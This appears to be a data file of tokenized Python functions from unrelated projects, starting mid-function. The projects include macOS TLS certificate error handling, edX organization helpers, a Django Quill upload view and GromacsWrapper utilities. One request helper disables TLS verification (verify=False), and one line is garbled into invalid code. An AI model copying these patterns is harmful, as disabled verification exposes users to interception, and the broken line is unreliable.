SecurityConst . kSecTrustResultUnspecified ] ) if trust_result_code not in invalid_chain_error_codes : handshake_result = SecurityConst . errSSLXCertChainInvalid else : handshake_result = Security . SSLHandshake ( session_context ) while handshake_result == SecurityConst . errSSLWouldBlock : handshake_result = Security . SSLHandshake ( session_context ) self . _done_handshake = True handshake_error_codes = set ( [ SecurityConst . errSSLXCertChainInvalid , SecurityConst . errSSLCertExpired , SecurityConst . errSSLCertNotYetValid , SecurityConst . errSSLUnknownRootCert , SecurityConst . errSSLNoRootCert , SecurityConst . errSSLHostNameMismatch , SecurityConst . errSSLInternal , ] ) # In testing, only errSSLXCertChainInvalid was ever returned for # all of these different situations, however we include the others # for completeness. To get the real reason we have to use the # certificate from the handshake and use the deprecated function # SecTrustGetCssmResultCode(). if handshake_result in handshake_error_codes : trust_ref_pointer = new ( Security , 'SecTrustRef *' ) result = Security . SSLCopyPeerTrust ( session_context , trust_ref_pointer ) handle_sec_error ( result ) trust_ref = unwrap ( trust_ref_pointer ) result_code_pointer = new ( Security , 'OSStatus *' ) result = Security . SecTrustGetCssmResultCode ( trust_ref , result_code_pointer ) result_code = deref ( result_code_pointer ) chain = extract_chain ( self . _server_hello ) self_signed = False revoked = False expired = False not_yet_valid = False no_issuer = False cert = None bad_hostname = False if chain : cert = chain [ 0 ] oscrypto_cert = load_certificate ( cert ) self_signed = oscrypto_cert . self_signed revoked = result_code == SecurityConst . CSSMERR_TP_CERT_REVOKED no_issuer = not self_signed and result_code == SecurityConst . CSSMERR_TP_NOT_TRUSTED expired = result_code == SecurityConst . CSSMERR_TP_CERT_EXPIRED not_yet_valid = result_code == SecurityConst . CSSMERR_TP_CERT_NOT_VALID_YET bad_hostname = result_code == SecurityConst . CSSMERR_APPLETP_HOSTNAME_MISMATCH # On macOS 10.12, some expired certificates return errSSLInternal if osx_version_info >= ( 10 , 12 ) : validity = cert [ 'tbs_certificate' ] [ 'validity' ] not_before = validity [ 'not_before' ] . chosen . native not_after = validity [ 'not_after' ] . chosen . native utcnow = datetime . datetime . now ( timezone . utc ) expired = not_after < utcnow not_yet_valid = not_before > utcnow if chain and chain [ 0 ] . hash_algo in set ( [ 'md5' , 'md2' ] ) : raise_weak_signature ( chain [ 0 ] ) if revoked : raise_revoked ( cert ) if bad_hostname : raise_hostname ( cert , self . _hostname ) elif expired or not_yet_valid : raise_expired_not_yet_valid ( cert ) elif no_issuer : raise_no_issuer ( cert ) elif self_signed : raise_self_signed ( cert ) if detect_client_auth_request ( self . _server_hello ) : raise_client_auth ( ) raise_verification ( cert ) if handshake_result == SecurityConst . errSSLPeerHandshakeFail : if detect_client_auth_request ( self . _server_hello ) : raise_client_auth ( ) raise_handshake ( ) if handshake_result == SecurityConst . errSSLWeakPeerEphemeralDHKey : raise_dh_params ( ) if handshake_result == SecurityConst . errSSLPeerProtocolVersion : raise_protocol_version ( ) if handshake_result in set ( [ SecurityConst . errSSLRecordOverflow , SecurityConst . errSSLProtocol ] ) : self . _server_hello += _read_remaining ( self . _socket ) raise_protocol_error ( self . _server_hello ) if handshake_result in set ( [ SecurityConst . errSSLClosedNoNotify , SecurityConst . errSSLClosedAbort ] ) : if not self . _done_handshake : self . _server_hello += _read_remaining ( self . _socket ) if detect_other_protocol ( self . _server_hello ) : raise_protocol_error ( self . _server_hello ) raise_disconnection ( ) if osx_version_info < ( 10 , 10 ) : dh_params_length = get_dh_params_length ( self . _server_hello ) if dh_params_length is not None and dh_params_length < 1024 : raise_dh_params ( ) would_block = handshake_result == SecurityConst . errSSLWouldBlock server_auth_complete = handshake_result == SecurityConst . errSSLServerAuthCompleted manual_validation = self . _session . _manual_validation and server_auth_complete if not would_block and not manual_validation : handle_sec_error ( handshake_result , TLSError ) self . _session_context = session_context protocol_const_pointer = new ( Security , 'SSLProtocol *' ) result = Security . SSLGetNegotiatedProtocolVersion ( session_context , protocol_const_pointer ) handle_sec_error ( result ) protocol_const = deref ( protocol_const_pointer ) self . _protocol = _PROTOCOL_CONST_STRING_MAP [ protocol_const ] cipher_int_pointer = new ( Security , 'SSLCipherSuite *' ) result = Security . SSLGetNegotiatedCipher ( session_context , cipher_int_pointer ) handle_sec_error ( result ) cipher_int = deref ( cipher_int_pointer ) cipher_bytes = int_to_bytes ( cipher_int , width = 2 ) self . _cipher_suite = CIPHER_SUITE_MAP . get ( cipher_bytes , cipher_bytes ) session_info = parse_session_info ( self . _server_hello , self . _client_hello ) self . _compression = session_info [ 'compression' ] self . _session_id = session_info [ 'session_id' ] self . _session_ticket = session_info [ 'session_ticket' ] except ( OSError , socket_ . error ) : if session_context : if osx_version_info < ( 10 , 8 ) : result = Security . SSLDisposeContext ( session_context ) handle_sec_error ( result ) else : result = CoreFoundation . CFRelease ( session_context ) handle_cf_error ( result ) self . _session_context = None self . close ( ) raise finally : # Trying to release crl_search_ref or ocsp_search_ref results in # a segmentation fault, so we do not do that if ssl_policy_ref : result = CoreFoundation . CFRelease ( ssl_policy_ref ) handle_cf_error ( result ) ssl_policy_ref = None if crl_policy_ref : result = CoreFoundation . CFRelease ( crl_policy_ref ) handle_cf_error ( result ) crl_policy_ref = None if ocsp_policy_ref : result = CoreFoundation . CFRelease ( ocsp_policy_ref ) handle_cf_error ( result ) ocsp_policy_ref = None if policy_array_ref : result = CoreFoundation . CFRelease ( policy_array_ref ) handle_cf_error ( result ) policy_array_ref = None
def close ( self ) : try : self . shutdown ( ) finally : if self . _socket : try : self . _socket . close ( ) except ( socket_ . error ) : pass self . _socket = None if self . _connection_id in _socket_refs : del _socket_refs [ self . _connection_id ]
def version ( self ) : ver = Version ( ) ver . conn = self . conn ver . attrs = { # Parent params 'service_id' : self . attrs [ 'id' ] , } ver . save ( ) return ver
def vcl ( self , name , content ) : vcl = VCL ( ) vcl . conn = self . conn vcl . attrs = { # Parent params 'service_id' : self . attrs [ 'service_id' ] , 'version' : self . attrs [ 'number' ] , # New instance params 'name' : name , 'content' : content , } vcl . save ( ) return vcl
def _patch ( self , route , data , headers = None , failure_message = None ) : headers = self . _get_headers ( headers ) response_lambda = ( lambda : requests . patch ( self . _get_qualified_route ( route ) , headers = headers , data = data , verify = False , proxies = self . proxies ) ) response = check_for_rate_limiting ( response_lambda ( ) , response_lambda ) return self . _handle_response ( response , failure_message )
def add_organization_course ( organization_data , course_key ) : _validate_course_key ( course_key ) _validate_organization_data ( organization_data ) data . create_organization_course ( organization = organization_data , course_key = course_key )
def remove_organization_course ( organization , course_key ) : _validate_organization_data ( organization ) _validate_course_key ( course_key ) return data . delete_organization_course ( course_key = course_key , organization = organization )
def course_key_is_valid ( course_key ) : if course_key is None : return False try : CourseKey . from_string ( text_type ( course_key ) ) except ( InvalidKeyError , UnicodeDecodeError ) : return False return True
def _inactivate_organization ( organization ) : [ _inactivate_organization_course_relationship ( record ) for record in internal . OrganizationCourse . objects . filter ( organization_id = organization . id , active = True ) ] [ _inactivate_record ( record ) for record in internal . Organization . objects . filter ( id = organization . id , active = True ) ]
def _activate_organization_course_relationship ( relationship ) : # pylint: disable=invalid-name # If the relationship doesn't exist or the organization isn't active we'll want to raise an error relationship = internal . OrganizationCourse . objects . get ( id = relationship . id , active = False , organization__active = True ) _activate_record ( relationship )
def _inactivate_organization_course_relationship ( relationship ) : # pylint: disable=invalid-name relationship = internal . OrganizationCourse . objects . get ( id = relationship . id , active = True ) _inactivate_record ( relationship )
def fetch_organization_courses ( organization ) : organization_obj = serializers . deserialize_organization ( organization ) queryset = internal . OrganizationCourse . objects . filter ( organization = organization_obj , active = True ) . select_related ( 'organization' ) return [ serializers . serialize_organization_with_course ( organization ) for organization in queryset ]
def fetch_course_organizations ( course_key ) : queryset = internal . OrganizationCourse . objects . filter ( course_id = text_type ( course_key ) , active = True ) . select_related ( 'organization' ) return [ serializers . serialize_organization_with_course ( organization ) for organization in queryset ]
def serialize_organization ( organization ) : return { 'id' : organization . id , 'name' : organization . name , 'short_name' : organization . short_name , 'description' : organization . description , 'logo' : organization . logo }
def deserialize_organization ( organization_dict ) : return models . Organization ( id = organization_dict . get ( 'id' ) , name = organization_dict . get ( 'name' , '' ) , short_name = organization_dict . get ( 'short_name' , '' ) , description = organization_dict . get ( 'description' , '' ) , logo = organization_dict . get ( 'logo' , '' ) )
def get_video ( self , node ) : video = Video ( ) video . _embed_code = self . get_embed_code ( node ) video . _embed_type = self . get_embed_type ( node ) video . _width = self . get_width ( node ) video . _height = self . get_height ( node ) video . _src = self . get_src ( node ) video . _provider = self . get_provider ( video . src ) return video
def get_siblings_content ( self , current_sibling , baselinescore_siblings_para ) : if current_sibling . tag == 'p' and self . parser . getText ( current_sibling ) : tmp = current_sibling if tmp . tail : tmp = deepcopy ( tmp ) tmp . tail = '' return [ tmp ] else : potential_paragraphs = self . parser . getElementsByTag ( current_sibling , tag = 'p' ) if potential_paragraphs is None : return None paragraphs = list ( ) for first_paragraph in potential_paragraphs : text = self . parser . getText ( first_paragraph ) if text : # no len(text) > 0 word_stats = self . stopwords_class ( language = self . get_language ( ) ) . get_stopword_count ( text ) paragraph_score = word_stats . get_stopword_count ( ) sibling_baseline_score = float ( .30 ) high_link_density = self . is_highlink_density ( first_paragraph ) score = float ( baselinescore_siblings_para * sibling_baseline_score ) if score < paragraph_score and not high_link_density : para = self . parser . createElement ( tag = 'p' , text = text , tail = None ) paragraphs . append ( para ) return paragraphs
def get_canonical_link ( self ) : if self . article . final_url : kwargs = { 'tag' : 'link' , 'attr' : 'rel' , 'value' : 'canonical' } meta = self . parser . getElementsByTag ( self . article . doc , * * kwargs ) if meta is not None and len ( meta ) > 0 : href = self . parser . getAttribute ( meta [ 0 ] , 'href' ) if href : href = href . strip ( ) o = urlparse ( href ) if not o . hostname : tmp = urlparse ( self . article . final_url ) domain = '%s://%s' % ( tmp . scheme , tmp . hostname ) href = urljoin ( domain , href ) return href return self . article . final_url
def make_list_elms_pretty ( self ) : for elm in self . parser . getElementsByTag ( self . top_node , tag = 'li' ) : elm . text = r' {}'.f o rmat(e l m.t e xt) 
def __crawl ( self , crawl_candidate ) : def crawler_wrapper ( parser , parsers_lst , crawl_candidate ) : try : crawler = Crawler ( self . config , self . fetcher ) article = crawler . crawl ( crawl_candidate ) except ( UnicodeDecodeError , ValueError ) as ex : if parsers_lst : parser = parsers_lst . pop ( 0 ) # remove it also! return crawler_wrapper ( parser , parsers_lst , crawl_candidate ) else : raise ex return article # use the wrapper parsers = list ( self . config . available_parsers ) parsers . remove ( self . config . parser_class ) return crawler_wrapper ( self . config . parser_class , parsers , crawl_candidate )
def get_urls ( self ) : urls = patterns ( '' , url ( r'^upload/$' , self . admin_site . admin_view ( self . handle_upload ) , name = 'quill-file-upload' ) , ) return urls + super ( QuillAdmin , self ) . get_urls ( )
def handle_upload ( self , request ) : if request . method != 'POST' : raise Http404 if request . is_ajax ( ) : try : filename = request . GET [ 'quillUploadFile' ] data = request is_raw = True except KeyError : return HttpResponseBadRequest ( "Invalid file upload." ) else : if len ( request . FILES ) != 1 : return HttpResponseBadRequest ( "Can only upload 1 file at a time." ) try : data = request . FILES [ 'quillUploadFile' ] filename = data . name is_raw = False except KeyError : return HttpResponseBadRequest ( 'Missing image `quillUploadFile`.' ) url = save_file ( data , filename , is_raw , default_storage ) response_data = { } response_data [ 'url' ] = url # Response content type needs to be text/html here or else # IE will try to download the file. return HttpResponse ( json . dumps ( response_data ) , content_type = "text/html; charset=utf-8" )
def render ( self , name , value , attrs = { } ) : if value is None : value = '' final_attrs = self . build_attrs ( attrs , name = name ) quill_app = apps . get_app_config ( 'quill' ) quill_config = getattr ( quill_app , self . config ) return mark_safe ( render_to_string ( quill_config [ 'template' ] , { 'final_attrs' : flatatt ( final_attrs ) , 'value' : value , 'id' : final_attrs [ 'id' ] , 'config' : self . config , } ) )
def formfield ( self , * * kwargs ) : defaults = { 'form_class' : RichTextFormField , 'config' : self . config , } defaults . update ( kwargs ) return super ( RichTextField , self ) . formfield ( * * defaults )
def render_toolbar ( context , config ) : quill_config = getattr ( quill_app , config ) t = template . loader . get_template ( quill_config [ 'toolbar_template' ] ) return t . render ( context )
def get_meta_image_url ( request , image ) : rendition = image . get_rendition ( filter = 'original' ) return request . build_absolute_uri ( rendition . url )
def read ( self , filename = None ) : self . _init_filename ( filename ) def BLANK ( i ) : return "B{0:04d}" . format ( i ) def COMMENT ( i ) : return "C{0:04d}" . format ( i ) data = odict ( ) iblank = icomment = 0 with open ( self . real_filename ) as mdp : for line in mdp : line = line . strip ( ) if len ( line ) == 0 : iblank += 1 data [ BLANK ( iblank ) ] = '' continue m = self . COMMENT . match ( line ) if m : icomment += 1 data [ COMMENT ( icomment ) ] = m . group ( 'value' ) continue # parameter m = self . PARAMETER . match ( line ) if m : # check for comments after parameter?? -- currently discarded parameter = m . group ( 'parameter' ) value = self . _transform ( m . group ( 'value' ) ) data [ parameter ] = value else : errmsg = '{filename!r}: unknown line in mdp file, {line!r}' . format ( * * vars ( ) ) self . logger . error ( errmsg ) raise ParseError ( errmsg ) super ( MDP , self ) . update ( data )
def prehook ( self , * * kwargs ) : cmd = [ 'smpd' , '-s' ] logger . info ( "Starting smpd: " + " " . join ( cmd ) ) rc = subprocess . call ( cmd ) return rc
def glob_parts ( prefix , ext ) : if ext . startswith ( '.' ) : ext = ext [ 1 : ] files = glob . glob ( prefix + '.' + ext ) + glob . glob ( prefix + '.part[0-9][0-9][0-9][0-9].' + ext ) files . sort ( ) # at least some rough sorting... return files
def _mdp_include_string ( dirs ) : include_paths = [ os . path . expanduser ( p ) for p in dirs ] return ' -I' . join ( [ '' ] + include_paths )
def parse_groups ( output ) : groups = [ ] for line in output . split ( '\n' ) : m = NDXGROUP . match ( line ) if m : d = m . groupdict ( ) groups . append ( { 'name' : d [ 'GROUPNAME' ] , 'nr' : int ( d [ 'GROUPNUMBER' ] ) , 'natoms' : int ( d [ 'NATOMS' ] ) } ) return groups
def delete_frames ( self ) : for frame in glob . glob ( self . frameglob ) : os . unlink ( frame )
def gmx_resid ( self , resid ) : try : gmx_resid = int ( self . offset [ resid ] ) except ( TypeError , IndexError ) : gmx_resid = resid + self . offset except KeyError : raise KeyError ( "offset must be a dict that contains the gmx resid for {0:d}" . format ( resid ) ) return gmx_resid
def _process_command ( self , command , name = None ) : self . _command_counter += 1 if name is None : name = "CMD{0:03d}" . format ( self . _command_counter ) # Need to build it with two make_ndx calls because I cannot reliably # name the new group without knowing its number. try : fd , tmp_ndx = tempfile . mkstemp ( suffix = '.ndx' , prefix = 'tmp_' + name + '__' ) cmd = [ command , '' , 'q' ] # empty command '' necessary to get list # This sometimes fails with 'OSError: Broken Pipe' --- hard to debug rc , out , err = self . make_ndx ( o = tmp_ndx , input = cmd ) self . check_output ( out , "No atoms found for selection {command!r}." . format ( * * vars ( ) ) , err = err ) # For debugging, look at out and err or set stdout=True, stderr=True # TODO: check '  0 r_300_&_ALA_&_O     :     1 atoms' has at least 1 atom ##print "DEBUG: _process_command()" ##print out groups = parse_ndxlist ( out ) last = groups [ - 1 ] # reduce and name this group fd , ndx = tempfile . mkstemp ( suffix = '.ndx' , prefix = name + '__' ) name_cmd = [ "keep {0:d}" . format ( last [ 'nr' ] ) , "name 0 {0!s}" . format ( name ) , 'q' ] rc , out , err = self . make_ndx ( n = tmp_ndx , o = ndx , input = name_cmd ) finally : utilities . unlink_gmx ( tmp_ndx ) return name , ndx
def _translate_residue ( self , selection , default_atomname = 'CA' ) : m = self . RESIDUE . match ( selection ) if not m : errmsg = "Selection {selection!r} is not valid." . format ( * * vars ( ) ) logger . error ( errmsg ) raise ValueError ( errmsg ) gmx_resid = self . gmx_resid ( int ( m . group ( 'resid' ) ) ) # magic offset correction residue = m . group ( 'aa' ) if len ( residue ) == 1 : gmx_resname = utilities . convert_aa_code ( residue ) # only works for AA else : gmx_resname = residue # use 3-letter for any resname gmx_atomname = m . group ( 'atom' ) if gmx_atomname is None : gmx_atomname = default_atomname return { 'resname' : gmx_resname , 'resid' : gmx_resid , 'atomname' : gmx_atomname }
def check_output ( self , make_ndx_output , message = None , err = None ) : if message is None : message = "" else : message = '\n' + message def format ( output , w = 60 ) : hrule = "====[ GromacsError (diagnostic output) ]" . ljust ( w , "=" ) return hrule + '\n' + str ( output ) + hrule rc = True if self . _is_empty_group ( make_ndx_output ) : warnings . warn ( "Selection produced empty group.{message!s}" . format ( * * vars ( ) ) , category = GromacsValueWarning ) rc = False if self . _has_syntax_error ( make_ndx_output ) : rc = False out_formatted = format ( make_ndx_output ) raise GromacsError ( "make_ndx encountered a Syntax Error, " "%(message)s\noutput:\n%(out_formatted)s" % vars ( ) ) if make_ndx_output . strip ( ) == "" : rc = False out_formatted = format ( err ) raise GromacsError ( "make_ndx produced no output, " "%(message)s\nerror output:\n%(out_formatted)s" % vars ( ) ) return rc
def _get_template ( t ) : if os . path . exists ( t ) : # 1) Is it an accessible file? pass else : _t = t _t_found = False for d in path : # 2) search config.path p = os . path . join ( d , _t ) if os . path . exists ( p ) : t = p _t_found = True break _t = os . path . basename ( t ) if not _t_found : # 3) try template dirs for p in templates . values ( ) : if _t == os . path . basename ( p ) : t = p _t_found = True # NOTE: in principle this could match multiple break #       times if more than one template dir existed. if not _t_found : # 4) try it as a key into templates try : t = templates [ t ] except KeyError : pass else : _t_found = True if not _t_found : # 5) nothing else to try... raise ValueError ( "Failed to locate the template file {t!r}." . format ( * * vars ( ) ) ) return os . path . realpath ( t )
def getpath ( self , section , option ) : return os . path . expanduser ( os . path . expandvars ( self . get ( section , option ) ) )
def _canonicalize ( self , filename ) : path , ext = os . path . splitext ( filename ) if not ext : ext = ".collection" return path + ext
def to_int64 ( a ) : # build new dtype and replace i4 --> i8 def promote_i4 ( typestr ) : if typestr [ 1 : ] == 'i4' : typestr = typestr [ 0 ] + 'i8' return typestr dtype = [ ( name , promote_i4 ( typestr ) ) for name , typestr in a . dtype . descr ] return a . astype ( dtype )
def _combine_arglist ( self , args , kwargs ) : _args = self . args + args _kwargs = self . kwargs . copy ( ) _kwargs . update ( kwargs ) return _args , _kwargs
def transform_args ( self , * args , * * kwargs ) : options = [ ] for option , value in kwargs . items ( ) : if not option . startswith ( '-' ) : # heuristic for turning key=val pairs into options # (fails for commands such as 'find' -- then just use args) if len ( option ) == 1 : option = '-' + option # POSIX style else : option = '--' + option # GNU option if value is True : options . append ( option ) continue elif value is False : raise ValueError ( 'A False value is ambiguous for option {0!r}' . format ( option ) ) if option [ : 2 ] == '--' : options . append ( option + '=' + str ( value ) ) # GNU option else : options . extend ( ( option , str ( value ) ) ) # POSIX style return options + list ( args )
def help ( self , long = False ) : print ( "\ncommand: {0!s}\n\n" . format ( self . command_name ) ) print ( self . __doc__ ) if long : print ( "\ncall method: command():\n" ) print ( self . __call__ . __doc__ )
def _combine_arglist ( self , args , kwargs ) : gmxargs = self . gmxargs . copy ( ) gmxargs . update ( self . _combineargs ( * args , * * kwargs ) ) return ( ) , gmxargs
def _combineargs ( self , * args , * * kwargs ) : d = { arg : True for arg in args } # switches are kwargs with value True d . update ( kwargs ) return d
def _build_arg_list ( self , * * kwargs ) : arglist = [ ] for flag , value in kwargs . items ( ) : # XXX: check flag against allowed values flag = str ( flag ) if flag . startswith ( '_' ) : flag = flag [ 1 : ] # python-illegal keywords are '_'-quoted if not flag . startswith ( '-' ) : flag = '-' + flag # now flag is guaranteed to start with '-' if value is True : arglist . append ( flag ) # simple command line flag elif value is False : if flag . startswith ( '-no' ) : # negate a negated flag ('noX=False' --> X=True --> -X ... but who uses that?) arglist . append ( '-' + flag [ 3 : ] ) else : arglist . append ( '-no' + flag [ 1 : ] ) # gromacs switches booleans by prefixing 'no' elif value is None : pass # ignore flag = None else : try : arglist . extend ( [ flag ] + value ) # option with value list except TypeError : arglist . extend ( [ flag , value ] ) # option with single value return list ( map ( str , arglist ) )
def _run_command ( self , * args , * * kwargs ) : result , p = super ( GromacsCommand , self ) . _run_command ( * args , * * kwargs ) self . check_failure ( result , command_string = p . command_string ) return result , p
def transform_args ( self , * args , * * kwargs ) : newargs = self . _combineargs ( * args , * * kwargs ) return self . _build_arg_list ( * * newargs )
def _get_stream ( filename , openfunction = open , mode = 'r' ) : try : stream = openfunction ( filename , mode = mode ) except ( IOError , OSError ) as err : # An exception might be raised due to two reasons, first the openfunction is unable to open the file, in this # case we have to ignore the error and return None. Second is when openfunction can't open the file because # either the file isn't there or the permissions don't allow access. if errno . errorcode [ err . errno ] in [ 'ENOENT' , 'EACCES' ] : six . reraise ( * sys . exc_info ( ) ) return None if mode . startswith ( 'r' ) : # additional check for reading (eg can we uncompress) --- is this needed? try : stream . readline ( ) except IOError : stream . close ( ) stream = None except : stream . close ( ) raise else : stream . close ( ) stream = openfunction ( filename , mode = mode ) return stream
def convert_aa_code ( x ) : if len ( x ) == 1 : return amino_acid_codes [ x . upper ( ) ] elif len ( x ) == 3 : return inverse_aa_codes [ x . upper ( ) ] else : raise ValueError ( "Can only convert 1-letter or 3-letter amino acid codes, " "not %r" % x )
def iterable ( obj ) : if isinstance ( obj , string_types ) : return False # avoid iterating over characters of a string if hasattr ( obj , 'next' ) : return True # any iterator will do try : len ( obj ) # anything else that might work except TypeError : return False return True
def unlink_f ( path ) : try : os . unlink ( path ) except OSError as err : if err . errno != errno . ENOENT : raise
def infix_filename ( self , name , default , infix , ext = None ) : if name is None : p , oldext = os . path . splitext ( default ) if ext is None : ext = oldext if ext . startswith ( os . extsep ) : ext = ext [ 1 : ] name = self . filename ( p + infix , ext = ext ) return name
def stop_logging ( ) : from . import log logger = logging . getLogger ( "gromacs" ) logger . info ( "GromacsWrapper %s STOPPED logging" , get_version ( ) ) log . clear_handlers ( logger )
def tool_factory ( clsname , name , driver , base = GromacsCommand ) : clsdict = { 'command_name' : name , 'driver' : driver , '__doc__' : property ( base . _get_gmx_docs ) } return type ( clsname , ( base , ) , clsdict )
def read ( self , filename = None ) : self . _init_filename ( filename ) data = odict ( ) with open ( self . real_filename ) as ndx : current_section = None for line in ndx : line = line . strip ( ) if len ( line ) == 0 : continue m = self . SECTION . match ( line ) if m : current_section = m . group ( 'name' ) data [ current_section ] = [ ] # can fail if name not legal python key continue if current_section is not None : data [ current_section ] . extend ( map ( int , line . split ( ) ) ) super ( NDX , self ) . update ( odict ( [ ( name , self . _transform ( atomnumbers ) ) for name , atomnumbers in data . items ( ) ] ) )
def assemble_topology ( self ) : self . logger . debug ( "starting to assemble topology..." ) top = '' self . logger . debug ( "making atom/pair/bond/angle/dihedral/improper types" ) top += self . toptemplate top = top . replace ( '*DEFAULTS*' , '' . join ( self . _make_defaults ( self . system ) ) ) top = top . replace ( '*ATOMTYPES*' , '' . join ( self . _make_atomtypes ( self . system ) ) ) top = top . replace ( '*NONBOND_PARAM*' , '' . join ( self . _make_nonbond_param ( self . system ) ) ) top = top . replace ( '*PAIRTYPES*' , '' . join ( self . _make_pairtypes ( self . system ) ) ) top = top . replace ( '*BONDTYPES*' , '' . join ( self . _make_bondtypes ( self . system ) ) ) top = top . replace ( '*CONSTRAINTTYPES*' , '' . join ( self . _make_constrainttypes ( self . system ) ) ) top = top . replace ( '*ANGLETYPES*' , '' . join ( self . _make_angletypes ( self . system ) ) ) top = top . replace ( '*DIHEDRALTYPES*' , '' . join ( self . _make_dihedraltypes ( self . system ) ) ) top = top . replace ( '*IMPROPERTYPES*' , '' . join ( self . _make_impropertypes ( self . system ) ) ) top = top . replace ( '*CMAPTYPES*' , '' . join ( self . _make_cmaptypes ( self . system ) ) ) for i , ( molname , m ) in enumerate ( self . system . dict_molname_mol . items ( ) ) : itp = self . itptemplate itp = itp . replace ( '*MOLECULETYPE*' , '' . join ( self . _make_moleculetype ( m , molname , m . exclusion_numb ) ) ) itp = itp . replace ( '*ATOMS*' , '' . join ( self . _make_atoms ( m ) ) ) itp = itp . replace ( '*BONDS*' , '' . join ( self . _make_bonds ( m ) ) ) itp = itp . replace ( '*PAIRS*' , '' . join ( self . _make_pairs ( m ) ) ) itp = itp . replace ( '*SETTLES*' , '' . join ( self . _make_settles ( m ) ) ) itp = itp . replace ( '*VIRTUAL_SITES3*' , '' . join ( self . _make_virtual_sites3 ( m ) ) ) itp = itp . replace ( '*EXCLUSIONS*' , '' . join ( self . _make_exclusions ( m ) ) ) itp = itp . replace ( '*ANGLES*' , '' . join ( self . _make_angles ( m ) ) ) itp = itp . replace ( '*DIHEDRALS*' , '' . join ( self . _make_dihedrals ( m ) ) ) itp = itp . replace ( '*IMPROPERS*' , '' . join ( self . _make_impropers ( m ) ) ) itp = itp . replace ( '*CMAPS*' , '' . join ( self . _make_cmaps ( m ) ) ) if not self . multiple_output : top += itp else : outfile = "mol_{0}.itp" . format ( molname ) top += '#include "mol_{0}.itp" \n' . format ( molname ) with open ( outfile , "w" ) as f : f . writelines ( [ itp ] ) top += '\n[system]  \nConvertedSystem\n\n' top += '[molecules] \n' molecules = [ ( "" , 0 ) ] for m in self . system . molecules : if ( molecules [ - 1 ] [ 0 ] != m . name ) : molecules . append ( [ m . name , 0 ] ) if molecules [ - 1 ] [ 0 ] == m . name : molecules [ - 1 ] [ 1 ] += 1 for molname , n in molecules [ 1 : ] : top += '{0:s}     {1:d}\n' . format ( molname , n ) top += '\n' with open ( self . outfile , 'w' ) as f : f . writelines ( [ top ] )
def check_mdpargs ( d ) : if len ( d ) > 0 : wmsg = "Unprocessed mdp option are interpreted as options for grompp:\n" + str ( d ) logger . warn ( wmsg ) warnings . warn ( wmsg , category = UsageWarning ) return len ( d ) == 0
def isMine ( self , scriptname ) : suffix = os . path . splitext ( scriptname ) [ 1 ] . lower ( ) if suffix . startswith ( '.' ) : suffix = suffix [ 1 : ] return self . suffix == suffix
def anumb_to_atom ( self , anumb ) : assert isinstance ( anumb , int ) , "anumb must be integer" if not self . _anumb_to_atom : # empty dictionary if self . atoms : for atom in self . atoms : self . _anumb_to_atom [ atom . number ] = atom return self . _anumb_to_atom [ anumb ] else : self . logger ( "no atoms in the molecule" ) return False else : if anumb in self . _anumb_to_atom : return self . _anumb_to_atom [ anumb ] else : self . logger ( "no such atom number ({0:d}) in the molecule" . format ( anumb ) ) return False
def total_regular_pixels_from_mask ( mask ) : total_regular_pixels = 0 for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : if not mask [ y , x ] : total_regular_pixels += 1 return total_regular_pixels
def mask_circular_from_shape_pixel_scale_and_radius ( shape , pixel_scale , radius_arcsec , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres_arcsec = mask_centres_from_shape_pixel_scale_and_centre ( shape = mask . shape , pixel_scale = pixel_scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y_arcsec = ( y - centres_arcsec [ 0 ] ) * pixel_scale x_arcsec = ( x - centres_arcsec [ 1 ] ) * pixel_scale r_arcsec = np . sqrt ( x_arcsec ** 2 + y_arcsec ** 2 ) if r_arcsec <= radius_arcsec : mask [ y , x ] = False return mask
def mask_circular_annular_from_shape_pixel_scale_and_radii ( shape , pixel_scale , inner_radius_arcsec , outer_radius_arcsec , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres_arcsec = mask_centres_from_shape_pixel_scale_and_centre ( shape = mask . shape , pixel_scale = pixel_scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y_arcsec = ( y - centres_arcsec [ 0 ] ) * pixel_scale x_arcsec = ( x - centres_arcsec [ 1 ] ) * pixel_scale r_arcsec = np . sqrt ( x_arcsec ** 2 + y_arcsec ** 2 ) if outer_radius_arcsec >= r_arcsec >= inner_radius_arcsec : mask [ y , x ] = False return mask
def mask_elliptical_from_shape_pixel_scale_and_radius ( shape , pixel_scale , major_axis_radius_arcsec , axis_ratio , phi , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres_arcsec = mask_centres_from_shape_pixel_scale_and_centre ( shape = mask . shape , pixel_scale = pixel_scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y_arcsec = ( y - centres_arcsec [ 0 ] ) * pixel_scale x_arcsec = ( x - centres_arcsec [ 1 ] ) * pixel_scale r_arcsec_elliptical = elliptical_radius_from_y_x_phi_and_axis_ratio ( y_arcsec , x_arcsec , phi , axis_ratio ) if r_arcsec_elliptical <= major_axis_radius_arcsec : mask [ y , x ] = False return mask
def mask_elliptical_annular_from_shape_pixel_scale_and_radius ( shape , pixel_scale , inner_major_axis_radius_arcsec , inner_axis_ratio , inner_phi , outer_major_axis_radius_arcsec , outer_axis_ratio , outer_phi , centre = ( 0.0 , 0.0 ) ) : mask = np . full ( shape , True ) centres_arcsec = mask_centres_from_shape_pixel_scale_and_centre ( shape = mask . shape , pixel_scale = pixel_scale , centre = centre ) for y in range ( mask . shape [ 0 ] ) : for x in range ( mask . shape [ 1 ] ) : y_arcsec = ( y - centres_arcsec [ 0 ] ) * pixel_scale x_arcsec = ( x - centres_arcsec [ 1 ] ) * pixel_scale inner_r_arcsec_elliptical = elliptical_radius_from_y_x_phi_and_axis_ratio ( y_arcsec , x_arcsec , inner_phi , inner_axis_ratio ) outer_r_arcsec_elliptical = elliptical_radius_from_y_x_phi_and_axis_ratio ( y_arcsec , x_arcsec , outer_phi , outer_axis_ratio ) if inner_r_arcsec_elliptical >= inner_major_axis_radius_arcsec and outer_r_arcsec_elliptical <= outer_major_axis_radius_arcsec : mask [ y , x ] = False return mask
